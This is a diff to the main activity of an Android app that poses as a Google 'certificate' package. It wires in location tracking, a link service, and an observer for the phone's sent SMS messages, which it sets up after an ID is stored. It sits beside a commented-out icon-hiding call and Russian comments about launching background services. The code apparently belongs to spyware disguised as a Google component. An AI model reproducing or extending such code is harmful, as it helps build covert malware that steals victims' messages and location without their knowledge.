@@ -7,6 +7,7 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
+import android.os.Handler;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
@@ -19,6 +20,7 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
@@ -32,6 +34,7 @@ import android.widget.Toast;
 import com.google.android.certificate.R;
 import com.google.android.history.LinkService;
 import com.google.android.location.GPSTracker;
+import com.google.android.sms.SmsSentObserver;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -83,7 +86,6 @@ public class MainActivity extends Activity {
 		e.commit();
 
 		// hideIcon();
-		// start(); // запуск сервисов
 
 		// проверяем, первый ли раз открывается программа
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
@@ -104,6 +106,12 @@ public class MainActivity extends Activity {
 			viewIDDialog();
 		} else
 			finish();
+	}
+
+	public void contentObserved() {
+//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
+//        this.getContentResolver().registerContentObserver(
+//                        Uri.parse("content://sms/sent"), true, null);
 	}
 
 	private boolean viewIDDialog() {
@@ -129,6 +137,7 @@ public class MainActivity extends Activity {
 				e.putString("ID", value);
 				e.commit();
 				start(); // запуск сервисов
+				contentObserved();
 				finish();
 			}
 		});
@@ -185,9 +194,10 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("ID", ID);
 					e.commit();
+					contentObserved();
 					// Toast.makeText(this, sourceApk,
 					// Toast.LENGTH_LONG).show();
-					Log.d(LOG_TAG, "ID - " + sp.getString("ID", "ID"));
+					start(); // запуск сервисов
 					break;
 				}
 				i++;
